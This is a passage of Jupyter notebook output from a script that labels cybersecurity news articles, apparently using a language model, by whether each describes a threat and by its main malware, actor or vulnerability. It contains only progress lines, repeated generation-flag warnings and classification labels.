            "Processing 218/427: buhti ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: LockBit 3.0\n",
            "Processing 219/427: lancefly merdoor zxshell custom backdoor...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Merdoor\n",
            "Processing 220/427: xtrader 3cx supply chain...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: X_TRADER_r7.17.90p608.exe\n",
            "  Processed 220/427 articles\n",
            "Processing 221/427: apt attacks telecoms africa mgbot...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: MgBot\n",
            "Processing 222/427: play ransomware volume shadow copy...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Grixba\n",
            "Processing 223/427: mantis palestinian attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Mantis\n",
            "Processing 224/427: 3cx supply chain attack...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: ffmpeg.dll\n",
            "Processing 225/427: blackfly espionage materials...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Blackfly\n",
            "Processing 226/427: clasiopa materials research...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Atharvan\n",
            "Processing 227/427: hydrochasma asia medical shipping intelligence gat...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: FRP\n",
            "Processing 228/427: frebniis malware iis...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Frebniis\n",
            "Processing 229/427: nodaria ukraine infostealer...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Infostealer.Graphiron\n",
            "Processing 230/427: bluebottle banks targeted africa...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Bluebottle\n",
            "  Processed 230/427 articles\n",
            "Processing 231/427: espionage asia governments cert authority...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Billbug\n",
            "Processing 232/427: cranefly new tools technique geppei danfuan...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Trojan.Geppei\n",
            "Processing 233/427: blackbyte exbyte ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Exbyte\n",
            "Processing 234/427: spyder loader cuckoobees hong kong...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Spyder Loader\n",
            "Processing 235/427: budworm espionage us state...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: HyperBro\n",
            "Processing 236/427: witchetty steganography espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Stegmap\n",
            "Processing 237/427: noberus blackcat ransomware ttps...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Noberus\n",
            "Processing 238/427: webworm espionage rats...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trochilus\n",
            "Processing 239/427: espionage asia governments...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: DLL side-loading\n",
            "Processing 240/427: russia ukraine shuckworm...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Shuckworm\n",
            "  Processed 240/427 articles\n",
            "Processing 241/427: lockbit targets servers...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: LockBit\n",
            "Processing 242/427: bumblebee loader cybercrime...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Bumblebee\n",
            "Processing 243/427: follina msdt exploit malware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2022-30190\n",
            "Processing 244/427: clipminer bitcoin mining hijacking...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trojan.Clipminer\n",
            "Processing 245/427: ransomware hive conti avoslocker...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Cobalt Strike\n",
            "Processing 246/427: stonefly north korea espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Stonefly\n",
            "Processing 247/427: shuckworm intense campaign ukraine...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Pterodo\n",
            "Processing 248/427: lazarus dream job chemical...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Lazarus Group\n",
            "Processing 249/427: cicada apt10 china ngo government attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Cicada\n",
            "Processing 250/427: spring4shell rce vuln java...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2022-22965\n",
            "  Processed 250/427 articles\n",
            "Processing 251/427: verblecon sophisticated malware cryptocurrency min...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trojan.Verblecon\n",
            "Processing 252/427: daxin backdoor espionage analysis...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Daxin\n",
            "Processing 253/427: ransomware threat landscape what expect 2022...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Conti\n",
            "Processing 254/427: daxin malware espionage analysis...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Daxin\n",
            "Processing 255/427: covid passport risks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 256/427: daxin backdoor espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Daxin\n",
            "Processing 257/427: ukraine wiper malware russia...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trojan.Killdisk\n",
            "Processing 258/427: china apt antlion taiwan financial attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: xPack\n",
            "Processing 259/427: shuckworm gamaredon espionage ukraine...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Pterodo\n",
            "Processing 260/427: threat landscape 2021...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "  Processed 260/427 articles\n",
            "Processing 261/427: log4j vulnerabilities attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2021-44228\n",
            "Processing 262/427: noberus blackcat alphv rust ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Noberus\n",
            "Processing 263/427: espionage campaign telecoms asia middle east...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Seedworm (aka MuddyWater)\n",
            "Processing 264/427: apache log4j zero day...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2021-44228\n",
            "Processing 265/427: yanluowang ransomware attacks continue...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Yanluowang\n",
            "Processing 266/427: blackmatter data exfiltration...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Exmatter\n",
            "Processing 267/427: banking trojan latam brazil...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: mpr.dll\n",
            "Processing 268/427: espionage campaign south east asia...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Orchestrator\n",
            "Processing 269/427: harvester new apt attacks asia...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Backdoor.Graphon\n",
            "Processing 270/427: yanluowang targeted ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Yanluowang\n",
            "  Processed 270/427 articles\n",
            "Processing 271/427: ransomware targeted 2021...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 272/427: pegasus forcedentry protection...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2021-30860\n",
            "Processing 273/427: grayfly china sidewalk malware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sidewalk\n",
            "Processing 274/427: lockfile ransomware new petitpotam windows...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: PetitPotam\n",
            "Processing 275/427: ransomware trends lockbit sodinokibi...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sodinokibi\n",
            "Processing 276/427: critical infrastructure south east asia espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: [Unknown Actor]\n",
            "Processing 277/427: kaseya ransomware supply chain...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: REvil (aka Sodinokibi)\n",
            "Processing 278/427: ransomware virtual machines...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: VirtualBox\n",
            "Processing 279/427: targeted ransomware ecosystem...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Conti ransomware group\n",
            "Processing 280/427: multi factor authentication new attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2021-22893\n",
            "  Processed 280/427 articles\n",
            "Processing 281/427: spectre bypass linux vulnerabilities...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: Meltdown\n",
            "Processing 282/427: security privacy covid tracing apps...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 283/427: microsoft exchange server protection...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2021-26855\n",
            "Processing 284/427: lazarus north korea indictment...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Lazarus Group\n",
            "Processing 285/427: solarwinds sunburst sending data...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sunburst\n",
            "Processing 286/427: solarwinds raindrop malware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Raindrop\n",
            "Processing 287/427: solarwinds sunburst command control...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sunburst\n",
            "Processing 288/427: solarwinds unique dga...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sunburst\n",
            "Processing 289/427: solarwinds attacks stealthy attackers attempted ev...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sunburst\n",
            "Processing 290/427: threat landscape trends q3 2020...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Emotet\n",
            "  Processed 290/427 articles\n",
            "Processing 291/427: sunburst supply chain attack solarwinds...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sunburst (Backdoor.Sunburst)\n",
            "Processing 292/427: cicada apt10 japan espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
